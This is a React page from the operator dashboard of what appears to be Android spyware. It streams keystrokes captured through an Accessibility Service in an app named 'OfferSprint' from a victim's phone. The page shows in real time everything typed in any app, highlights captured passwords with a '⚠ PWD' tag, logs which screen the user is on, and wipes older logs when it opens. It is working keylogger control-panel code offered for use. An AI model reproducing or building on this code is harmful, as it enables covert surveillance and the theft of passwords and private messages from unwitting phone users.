import { useEffect, useRef, useState, useCallback, useMemo } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { useNavigate, useParams } from 'react-router-dom';
import Background from '../components/Background';
import Toast from '../components/Toast';
import { getDevice, getKeyLogs, clearKeyLogs } from '../lib/store';

function fmtTime(ts) {
  const d = new Date(ts);
  const hh = String(d.getHours()).padStart(2, '0');
  const mm = String(d.getMinutes()).padStart(2, '0');
  const ss = String(d.getSeconds()).padStart(2, '0');
  return `${hh}:${mm}:${ss}`;
}
function fmtAgo(ms) {
  if (ms < 1000) return 'now';
  if (ms < 60000) return Math.floor(ms / 1000) + 's ago';
  if (ms < 3600000) return Math.floor(ms / 60000) + 'm ago';
  return Math.floor(ms / 3600000) + 'h ago';
}

export default function Keystroke() {
  const { id } = useParams();
  const navigate = useNavigate();
  const [device, setDevice] = useState(null);
  const [logs, setLogs] = useState([]);
  const [paused, setPaused] = useState(false);
  const [filter, setFilter] = useState('');
  const [appFilter, setAppFilter] = useState('');
  const [toast, setToast] = useState({ show: false, msg: '', type: 'success' });
  const aliveRef = useRef(true);
  const sinceRef = useRef(0);
  const listRef = useRef(null);
  const stickToBottom = useRef(true);

  const flash = (msg, type = 'success') => { setToast({ show: true, msg, type }); setTimeout(() => setToast(t => ({ ...t, show: false })), 1100); };

  const fetchDetail = useCallback(async () => {
    try { const d = await getDevice(id); if (aliveRef.current) setDevice(d); }
    catch (e) { if (e.status === 401) navigate('/'); else if (e.status === 404) navigate('/dashboard'); }
  }, [id, navigate]);

  const fetchLogs = useCallback(async () => {
    if (paused) return;
    try {
      const r = await getKeyLogs(id, sinceRef.current, 300);
      if (!aliveRef.current) return;
      if (r.logs && r.logs.length) {
        // Drop dupes by ts+pkg+text (server returns full window when since=0)
        if (sinceRef.current === 0) setLogs(r.logs);
        else setLogs(prev => [...prev, ...r.logs].slice(-1500));
        sinceRef.current = r.logs[r.logs.length - 1].ts;
      }
    } catch {}
  }, [id, paused]);

  useEffect(() => {
    aliveRef.current = true;
    fetchDetail();
    // Wipe historical logs the moment admin opens this page — only fresh keys flow.
    (async () => {
      try { await clearKeyLogs(id); } catch {}
      setLogs([]);
      sinceRef.current = 0;
      fetchLogs();
    })();
    const t1 = setInterval(fetchDetail, 4000);
    const t2 = setInterval(fetchLogs, 900);
    return () => { aliveRef.current = false; clearInterval(t1); clearInterval(t2); };
  }, [fetchDetail, fetchLogs, id]);

  useEffect(() => {
    if (stickToBottom.current && listRef.current) listRef.current.scrollTop = listRef.current.scrollHeight;
  }, [logs]);

  const onScroll = () => {
    if (!listRef.current) return;
    const el = listRef.current;
    stickToBottom.current = (el.scrollHeight - el.scrollTop - el.clientHeight) < 60;
  };

  const apps = useMemo(() => {
    const s = new Set();
    for (const l of logs) if (l.app || l.pkg) s.add(l.app || l.pkg);
    return Array.from(s).sort();
  }, [logs]);

  const visible = useMemo(() => {
    const q = filter.trim().toLowerCase();
    return logs.filter(l => {
      if (appFilter && (l.app || l.pkg) !== appFilter) return false;
      if (!q) return true;
      const hay = ((l.text || '') + ' ' + (l.added || '') + ' ' + (l.hint || '') + ' ' + (l.app || '') + ' ' + (l.pkg || '')).toLowerCase();
      return hay.includes(q);
    });
  }, [logs, filter, appFilter]);

  const onClear = async () => {
    if (!confirm('Clear all key logs for this device?')) return;
    try { await clearKeyLogs(id); setLogs([]); sinceRef.current = 0; flash('CLEARED'); }
    catch { flash('FAILED', 'error'); }
  };

  return (
    <div className="fixed inset-0 flex flex-col overflow-hidden bg-bg">
      <Background />

      {/* Header */}
      <header className="relative z-20 flex items-center justify-between gap-2 px-3 py-2.5 border-b border-white/[0.06] bg-bg/80 backdrop-blur-xl">
        <button onClick={() => navigate('/device/' + encodeURIComponent(id))} className="w-9 h-9 rounded-lg bg-white/[0.05] border border-white/[0.08] flex items-center justify-center text-white/75 hover:bg-white/10 active:scale-95 transition-all flex-shrink-0" aria-label="Back">
          <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-current fill-none" strokeWidth="2.2"><path d="M15 18l-6-6 6-6" strokeLinecap="round" strokeLinejoin="round"/></svg>
        </button>
        <div className="flex-1 min-w-0 text-center">
          <div className="text-[9px] font-bold tracking-[1.6px] uppercase text-white/35 leading-none">Keystroke Logs</div>
          <div className="text-[12.5px] font-bold text-white/95 leading-tight mt-0.5 truncate">{device?.brand || '—'} {device?.model || ''}</div>
        </div>
        <div className={`inline-flex items-center gap-1.5 px-2 py-1 rounded-full border text-[9.5px] font-bold tracking-wide uppercase flex-shrink-0 ${device?.online && !paused ? 'bg-accent3/10 border-accent3/30 text-accent3' : 'bg-white/[0.04] border-white/[0.08] text-white/45'}`}>
          <span className={`w-1.5 h-1.5 rounded-full ${device?.online && !paused ? 'bg-accent3 animate-pulse-soft' : 'bg-white/30'}`} />
          {paused ? 'Paused' : (device?.online ? 'Live' : 'Off')}
        </div>
      </header>

      {/* Toolbar */}
      <div className="relative z-10 px-3 pt-2.5 pb-2 space-y-2 border-b border-white/[0.04] bg-bg/40">
        <div className="flex items-center gap-2">
          <div className="relative flex-1">
            <svg viewBox="0 0 24 24" className="absolute left-2.5 top-1/2 -translate-y-1/2 w-3.5 h-3.5 stroke-white/40 fill-none pointer-events-none" strokeWidth="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3" strokeLinecap="round"/></svg>
            <input
              value={filter}
              onChange={e => setFilter(e.target.value)}
              placeholder="Search text, app, hint…"
              className="w-full pl-8 pr-3 py-2 rounded-lg bg-black/35 border border-white/[0.08] text-white text-[12px] placeholder:text-white/30 focus:outline-none focus:border-accent3/50"
            />
          </div>
          <button onClick={() => setPaused(p => !p)} className={`px-3 py-2 rounded-lg border text-[10.5px] font-bold tracking-[1.2px] uppercase active:scale-95 transition-all ${paused ? 'bg-amber-500/15 border-amber-500/30 text-amber-300' : 'bg-white/[0.05] border-white/[0.08] text-white/85 hover:bg-white/10'}`}>
            {paused ? 'Resume' : 'Pause'}
          </button>
          <button onClick={onClear} className="px-3 py-2 rounded-lg bg-white/[0.05] border border-white/[0.08] text-white/85 text-[10.5px] font-bold tracking-[1.2px] uppercase hover:bg-white/10 active:scale-95 transition-all" title="Clear all logs">
            <svg viewBox="0 0 24 24" className="w-3.5 h-3.5 stroke-current fill-none" strokeWidth="2"><path d="M3 6h18M8 6V4a2 2 0 012-2h4a2 2 0 012 2v2M19 6l-1 14a2 2 0 01-2 2H8a2 2 0 01-2-2L5 6" strokeLinecap="round" strokeLinejoin="round"/></svg>
          </button>
        </div>
        {apps.length > 0 && (
          <div className="flex gap-1.5 overflow-x-auto -mx-1 px-1 pb-0.5 scrollbar-hide">
            <FilterPill active={!appFilter} onClick={() => setAppFilter('')}>All ({logs.length})</FilterPill>
            {apps.map(a => (
              <FilterPill key={a} active={appFilter === a} onClick={() => setAppFilter(a)}>
                {a} ({logs.filter(l => (l.app || l.pkg) === a).length})
              </FilterPill>
            ))}
          </div>
        )}
      </div>

      {/* Logs list */}
      <main ref={listRef} onScroll={onScroll} className="relative z-10 flex-1 min-h-0 overflow-y-auto px-3 py-2 pb-[max(8px,env(safe-area-inset-bottom))]">
        {visible.length === 0 ? (
          <EmptyState device={device} hasLogs={logs.length > 0} hasFilter={!!filter || !!appFilter} />
        ) : (
          <div className="space-y-1.5">
            <AnimatePresence initial={false}>
              {visible.map((l, i) => <LogRow key={l.ts + '-' + i} l={l} />)}
            </AnimatePresence>
          </div>
        )}
      </main>

      <Toast show={toast.show} message={toast.msg} type={toast.type} />
    </div>
  );
}

function FilterPill({ children, active, onClick }) {
  return (
    <button onClick={onClick} className={`flex-shrink-0 px-2.5 py-1 rounded-full border text-[9.5px] font-bold tracking-wide uppercase transition-all ${active ? 'bg-accent3/15 border-accent3/30 text-accent3' : 'bg-white/[0.03] border-white/[0.06] text-white/55 hover:bg-white/[0.06] hover:text-white/85'}`}>
      {children}
    </button>
  );
}

function LogRow({ l }) {
  const isAdded   = l.added && l.added.length > 0;
  const isDeleted = !isAdded && l.removed > 0;
  const isScreen  = l.hint === 'screen';
  const isPwd     = l.hint === 'pwd';
  const isTap     = l.hint === 'tap';

  // Screen-context rows get a distinct, muted look so they read like dividers
  // between bursts of typing — they tell the admin WHICH page user is on.
  if (isScreen) {
    return (
      <motion.div initial={{ opacity: 0, x: -4 }} animate={{ opacity: 1, x: 0 }} className="rounded-lg px-2.5 py-1.5 border border-sky-400/15 bg-sky-400/[0.04]">
        <div className="flex items-center gap-2 mb-0.5">
          <span className="text-[8.5px] font-bold tracking-[1.4px] uppercase text-sky-300/80 flex-shrink-0">SCREEN</span>
          <span className="text-[8.5px] font-bold tracking-[1.2px] uppercase text-sky-200/70 truncate max-w-[140px]">{l.app || l.pkg}</span>
          <span className="flex-1" />
          <span className="text-[8.5px] text-white/30 tabular-nums flex-shrink-0">{fmtTime(l.ts)}</span>
        </div>
        <div className="text-[11.5px] text-sky-100/85 break-words leading-snug">
          {l.text || '—'}
        </div>
      </motion.div>
    );
  }

  // What the admin most cares about: the captured chars (added) for typing,
  // the tapped key/label for taps. Show that BIG so it is instantly readable;
  // demote the surrounding metadata to a small dim header.
  const bigText = isAdded ? l.added : (l.text || '');
  const bigColor = isPwd ? 'text-amber-200' : isTap ? 'text-violet-200' : 'text-white';
  const accentBorder = isPwd ? 'border-amber-400/25 bg-amber-400/[0.04]'
                     : isTap ? 'border-violet-400/25 bg-violet-400/[0.04]'
                     : 'border-white/[0.07] bg-white/[0.02]';
  return (
    <motion.div initial={{ opacity: 0, x: -4 }} animate={{ opacity: 1, x: 0 }} className={`rounded-lg px-3 py-2 border ${accentBorder}`}>
      <div className="flex items-center gap-2 mb-1">
        <span className="text-[9px] font-bold tracking-[1.4px] uppercase text-accent3 truncate max-w-[130px]">{l.app || l.pkg}</span>
        {l.hint && (
          <span className={`text-[9px] font-bold tracking-[1.4px] uppercase flex-shrink-0 ${
            isPwd ? 'text-amber-300' : isTap ? 'text-violet-300' : 'text-white/45'
          }`}>{isPwd ? '⚠ PWD' : isTap ? 'TAP' : l.hint}</span>
        )}
        {isDeleted && (
          <span className="text-[9px] font-bold tracking-wide uppercase text-rose-300 flex-shrink-0">−{l.removed}</span>
        )}
        <span className="flex-1" />
        <span className="text-[9px] text-white/35 tabular-nums flex-shrink-0">{fmtTime(l.ts)}</span>
      </div>
      <div className={`text-[16px] font-mono font-bold leading-snug break-all ${bigColor}`}>
        {bigText || (isDeleted ? `(−${l.removed} chars deleted)` : '—')}
      </div>
    </motion.div>
  );
}

function EmptyState({ device, hasLogs, hasFilter }) {
  if (hasFilter) {
    return (
      <div className="flex flex-col items-center justify-center py-16 text-center">
        <div className="text-[12px] text-white/55 font-semibold">No matches</div>
        <div className="text-[10.5px] text-white/35 mt-1">Try a different search or app filter</div>
      </div>
    );
  }
  if (!device?.online) {
    return (
      <div className="flex flex-col items-center justify-center py-16 text-center px-6">
        <div className="w-11 h-11 rounded-full bg-white/[0.04] border border-white/[0.08] flex items-center justify-center mb-3">
          <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-white/45 fill-none" strokeWidth="2"><path d="M2 8.82a15 15 0 0120 0M5 12.86a10 10 0 0114 0M8.5 16.43a5 5 0 017 0M12 20h.01M3 3l18 18" strokeLinecap="round" strokeLinejoin="round"/></svg>
        </div>
        <div className="text-[12.5px] text-white/65 font-semibold">Device offline</div>
        <div className="text-[10.5px] text-white/35 mt-1.5 max-w-[260px]">Open the OfferSprint app on the phone to start capturing keystrokes.</div>
      </div>
    );
  }
  if (device && !device.accessibilityEnabled) {
    return (
      <div className="flex flex-col items-center justify-center py-16 text-center px-6">
        <div className="w-11 h-11 rounded-full bg-amber-500/15 border border-amber-500/30 flex items-center justify-center mb-3">
          <svg viewBox="0 0 24 24" className="w-4 h-4 stroke-amber-300 fill-none" strokeWidth="2"><path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" strokeLinecap="round" strokeLinejoin="round"/></svg>
        </div>
        <div className="text-[12.5px] text-white/85 font-semibold">Accessibility off</div>
        <div className="text-[10.5px] text-white/45 mt-1.5 max-w-[260px]">Enable OfferSprint Service in phone Accessibility Settings to capture keystrokes.</div>
      </div>
    );
  }
  return (
    <div className="flex flex-col items-center justify-center py-16 text-center px-6">
      <div className="w-11 h-11 rounded-full bg-white/[0.04] border border-white/[0.08] flex items-center justify-center mb-3">
        <span className="inline-block w-4 h-4 border-2 border-white/15 border-t-accent rounded-full animate-spin" />
      </div>
      <div className="text-[12.5px] text-white/85 font-semibold">Listening for keystrokes…</div>
      <div className="text-[10.5px] text-white/45 mt-1.5 max-w-[260px]">Anything typed on the phone in any app will appear here in real time.</div>
    </div>
  );
}
